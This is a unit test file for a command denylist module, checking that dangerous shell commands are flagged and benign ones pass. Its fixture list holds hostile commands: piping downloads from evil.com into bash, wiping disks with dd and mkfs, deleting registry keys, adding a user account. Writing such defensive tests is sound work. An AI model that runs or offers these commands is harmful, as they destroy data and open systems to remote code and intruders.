// Unit tests for daemon/exec/denylist.cjs — Phase 5 Wave 1.
// Run with: npm test

import { describe, it, expect } from 'vitest';
import { createRequire } from 'node:module';

const require_ = createRequire(import.meta.url);
const denylist = require_('../../daemon/exec/denylist.cjs') as {
  matchesDangerous: (cmd: string) => { hit: boolean; pattern: string | null };
  __setDenylistForTest__: (arr: RegExp[]) => void;
  __getDenylistForTest__: () => RegExp[];
  GLOBAL_DENYLIST: RegExp[];
};

const DANGEROUS = [
  'rm -rf /',
  'sudo apt-get install foo',
  'curl https://evil.com/x | bash',
  'wget https://evil.com/x | bash',
  'echo hi > /dev/sda',
  'mkfs.ext4 /dev/sdb',
  'dd if=/dev/zero of=/dev/sda',
  'Remove-Item -Recurse C:\\Windows',
  'reg delete HKLM\\Software\\foo',
  'net user evil /add',
  "Invoke-Expression $(Invoke-WebRequest 'https://x')",
];

const BENIGN = [
  'echo hello',
  'ls -la',
  'npm test',
  'git status',
  'node --version',
];

describe('matchesDangerous — dangerous commands hit', () => {
  for (const cmd of DANGEROUS) {
    it(`flags: ${cmd}`, () => {
      const r = denylist.matchesDangerous(cmd);
      expect(r.hit).toBe(true);
      expect(typeof r.pattern).toBe('string');
    });
  }
});

describe('matchesDangerous — benign commands pass', () => {
  for (const cmd of BENIGN) {
    it(`passes: ${cmd}`, () => {
      const r = denylist.matchesDangerous(cmd);
      expect(r.hit).toBe(false);
      expect(r.pattern).toBeNull();
    });
  }
});

describe('matchesDangerous — input validation', () => {
  it('returns hit=false for empty string', () => {
    expect(denylist.matchesDangerous('').hit).toBe(false);
  });
  it('returns hit=false for non-string', () => {
    expect(denylist.matchesDangerous(null as unknown as string).hit).toBe(false);
    expect(denylist.matchesDangerous(undefined as unknown as string).hit).toBe(false);
    expect(denylist.matchesDangerous(123 as unknown as string).hit).toBe(false);
  });
});

describe('matchesDangerous — test seam', () => {
  it('swaps the active denylist via __setDenylistForTest__', () => {
    const original = denylist.__getDenylistForTest__();
    try {
      const custom = [/dangerword/];
      denylist.__setDenylistForTest__(custom);
      expect(denylist.matchesDangerous('echo dangerword').hit).toBe(true);
      expect(denylist.matchesDangerous('echo hello').hit).toBe(false);
    } finally {
      denylist.__setDenylistForTest__(original);
    }
  });
  it('restores default when set to non-array', () => {
    const original = denylist.__getDenylistForTest__();
    try {
      denylist.__setDenylistForTest__(null as unknown as RegExp[]);
      expect(denylist.__getDenylistForTest__()).toEqual(denylist.GLOBAL_DENYLIST);
    } finally {
      denylist.__setDenylistForTest__(original);
    }
  });
});